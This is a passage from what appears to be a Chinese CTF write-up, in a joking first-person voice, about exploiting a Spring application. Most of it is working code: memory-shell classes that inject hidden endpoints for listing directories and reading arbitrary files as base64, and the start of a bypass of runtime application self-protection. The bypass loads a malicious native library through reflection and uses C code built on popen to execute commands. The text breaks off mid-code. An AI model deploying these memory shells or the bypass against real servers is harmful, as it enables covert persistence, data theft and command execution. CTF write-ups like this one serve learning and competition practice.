class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exls</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> {</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">static</span>{</span><br><span class="line">        <span class="keyword">try</span>{</span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">"config"</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> exls.class.getMethod(<span class="string">"ls"</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">"/ls"</span>).options(config).build();</span><br><span class="line">            <span class="type">exls</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exls</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        }<span class="keyword">catch</span> (Exception e){</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ls</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException {</span><br><span class="line">            <span class="type">String</span> <span class="variable">rootDirectory</span> <span class="operator">=</span> request.getParameter(<span class="string">"dir"</span>); <span class="comment">// 替换为你的根目录路径</span></span><br><span class="line">            listFilesAndDirectories(<span class="keyword">new</span> <span class="title class_">File</span>(rootDirectory),response);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">listFilesAndDirectories</span><span class="params">(File directory,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException {</span><br><span class="line">            File[] files = directory.listFiles();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (files != <span class="literal">null</span>) {</span><br><span class="line">                <span class="keyword">for</span> (File file : files) {</span><br><span class="line">                    <span class="keyword">if</span> (file.isFile()) {</span><br><span class="line">                        response.getWriter().write(<span class="string">"File: "</span> + file.getAbsolutePath());</span><br><span class="line">                    } <span class="keyword">else</span> <span class="keyword">if</span> (file.isDirectory()) {</span><br><span class="line">                        response.getWriter().write(<span class="string">"Directory: "</span> + file.getAbsolutePath());</span><br><span class="line">                        listFilesAndDirectories(file,response); <span class="comment">// 递归遍历子目录</span></span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>这样的缺点是列出根目录的时候太多杂碎的东西，👴看不动，要不是👴知道 /home 下面有东西，这玩意太难找了.</p>
<p>优化一下</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exls</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> {</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">static</span>{</span><br><span class="line">        <span class="keyword">try</span>{</span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">"config"</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> exls.class.getMethod(<span class="string">"ls1"</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">"/ls1"</span>).options(config).build();</span><br><span class="line">            <span class="type">exls</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exls</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        }<span class="keyword">catch</span> (Exception e){</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ls1</span><span class="params">(HttpServletRequest request,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException {</span><br><span class="line">            <span class="type">String</span> <span class="variable">rootDirectory</span> <span class="operator">=</span> request.getParameter(<span class="string">"dir"</span>); <span class="comment">// 替换为你的根目录路径</span></span><br><span class="line">            listFilesAndDirectories(<span class="keyword">new</span> <span class="title class_">File</span>(rootDirectory),response);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">listFilesAndDirectories</span><span class="params">(File directory,HttpServletResponse response)</span> <span class="keyword">throws</span> IOException {</span><br><span class="line">            File[] files = directory.listFiles();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (files != <span class="literal">null</span>) {</span><br><span class="line">                <span class="keyword">for</span> (File file : files) {</span><br><span class="line">                    <span class="keyword">if</span> (file!=<span class="literal">null</span>) {</span><br><span class="line">                        response.getWriter().write(file.getAbsolutePath()+<span class="string">"\r\n"</span>);</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106112020.png" alt="微信截图_20231106112020"></p>
<p>这样看起来舒服多了，👴很中意😊</p>
<h3 id="读文件"><a class="markdownIt-Anchor" href="#读文件">#</a> 读文件</h3>
<p>👴想尝试柏璐杯的代码，直接通过 <code>ResponseEntity</code>  下载文件，很可惜，失败了，但是涉及到二进制文件的读取，怎么办，👴用 base64 读出来，👴真 tm 是完美天才的 idol (bushi)</p>
<p>终于👴想明白了一件事，写出了内存🐎</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exre</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> {</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException {</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">static</span>{</span><br><span class="line">        <span class="keyword">try</span>{</span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">"org.springframework.web.servlet.DispatcherServlet.CONTEXT"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">"config"</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> exre.class.getMethod(<span class="string">"readfile2"</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">"/readfile2"</span>).options(config).build();</span><br><span class="line">            <span class="type">exre</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exre</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        }<span class="keyword">catch</span> (Exception e){</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readfile2</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException {</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> request.getParameter(<span class="string">"filepath"</span>);</span><br><span class="line">            <span class="keyword">if</span>(filePath!=<span class="literal">null</span>){</span><br><span class="line">                <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">                <span class="type">byte</span>[] fileBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[fileInputStream.available()];</span><br><span class="line">                fileInputStream.read(fileBytes);</span><br><span class="line">                fileInputStream.close();</span><br><span class="line">                <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileBytes);</span><br><span class="line">                response.getWriter().write(base64String);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>什么，你说你不会 base64 转成二进制文件？🤣</p>
<p>自己写个脚本转换都行，👴告诉你，还能上 cyberchef 转换，还能导出为文件😅</p>
<h2 id="rasp"><a class="markdownIt-Anchor" href="#rasp">#</a> RASP😅😡</h2>
<p>绕过 content-length 就简单了？8 可能！</p>
<p>nmb 甚至有 RASP,√Ⅷ,👴没学过.</p>
<h3 id="啥事-rasp"><a class="markdownIt-Anchor" href="#啥事rasp">#</a> 啥事 RASP</h3>
<p>在 2012 年的时候，Gartner 引入了 <code>Runtime application self-protection</code>  一词，简称为 RASP。它是一种新型应用安全保护技术，它将保护程序像疫苗一样注入到应用程序中，应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遭受到实际攻击伤害，就可以自动对其进行防御，而不需要进行人工干预。</p>
<p>RASP 技术可以快速的将安全防御功能整合到正在运行的应用程序中，它拦截从应用程序到系统的所有调用，确保它们是安全的，并直接在应用程序内验证数据请求。Web 和非 Web 应用程序都可以通过 RASP 进行保护。该技术不会影响应用程序的设计，因为 RASP 的检测和保护功能是在应用程序运行的系统上运行的。</p>
<p>👴说人话：就是 nm 把内存过滤，实时动态防护。别人叫内存马，你叫内存盾.</p>
<p>至于这玩意，👴就不在这里赘述了，先等👴新开个文章，记录一下 RASP 的学习笔记.</p>
<p>👴回来了，到了最后的步骤了., 看👴绕过这该死的 RASP.</p>
<p>通过 java-agent 插桩技术，hook 住了一些底层的类，使得 java 的 exec 不能够执行</p>
<p>一般是 unix 或这 forkandexec</p>
<p><code>forkAndExec</code>  通常是与操作系统进程管理相关的操作，用于在类 Unix 操作系统中（如 Linux）创建子进程并在子进程中执行指定的程序。</p>
<p>可恶的 RASP hook 住了这些类</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106112422.png" alt="微信截图_20231106112422"></p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106112531.png" alt="微信截图_20231106112531"></p>
<p>甚至还不让本地 JNI 加载了， <code>loadLibrary0</code>  也被 hook 了</p>
<h2 id="解决方案"><a class="markdownIt-Anchor" href="#解决方案">#</a> 解决方案😒</h2>
<p>底层的 native 方法  <code>java.lang.ClassLoader.NativeLibrary#load</code>  并未被 hook，并且反射也是可以正常使用的，所以可以尝试使用反射来调用  <code>java.lang.ClassLoader.NativeLibrary</code>  中的  <code>load</code>  方法来加载恶意 so 文件执行命令</p>
<p>船新姿势之 <code>javah</code></p>
<p>可以，我就喜欢 h😊</p>
<p><code>javah</code>  是 Java 开发工具包 (JDK) 提供的一个命令行工具，用于生成 Java 类的本地方法接口 (Native Method Interface, JNI) 头文件。JNI 允许 Java 代码与本地（通常是 C 或 C++）代码进行交互，这在某些情况下非常有用，例如与硬件交互或与现有的本地库进行集成。</p>
<p>编写包含本地方法声明的 Java 类，使用  <code>native</code>  关键字声明本地方法。</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span>  {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">execCmd</span><span class="params">(String cmd)</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>然后使用 javac 编译成 class, 然后使用 javah 编译成 h 文件</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javah -jni EvilClass</span><br><span class="line">    </span><br></pre></td></tr></tbody></table></figure>
<p>生成的 EvilClass.h 如下</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span></span><br><span class="line">#include &lt;jni.h&gt;</span><br><span class="line"><span class="comment">/* Header for class EvilClass */</span></span><br><span class="line"></span><br><span class="line">#ifndef _Included_EvilClass</span><br><span class="line">#define _Included_EvilClass</span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern <span class="string">"C"</span> {</span><br><span class="line">#endif</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Class:     EvilClass</span></span><br><span class="line"><span class="comment"> * Method:    execCmd</span></span><br><span class="line"><span class="comment"> * Signature: (Ljava/lang/String;)Ljava/lang/String;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JNIEXPORT jstring JNICALL <span class="title function_">Java_EvilClass_execCmd</span></span><br><span class="line">  <span class="params">(JNIEnv *, jclass, jstring)</span>;</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">}</span><br><span class="line">#endif</span><br><span class="line">#endif</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>接下来还要根据这个 h 文件写 C 文件，nm👴不会 c</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">execmd</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmd, <span class="type">char</span> *result)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>*<span class="number">12</span>];              <span class="comment">//定义缓冲区</span></span><br><span class="line">    FILE *pipe = popen(cmd, <span class="string">"r"</span>); <span class="comment">//打开管道，并执行命令</span></span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//返回0表示运行失败</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!feof(pipe))</span><br><span class="line">    {</span><br><span class="line">        <span 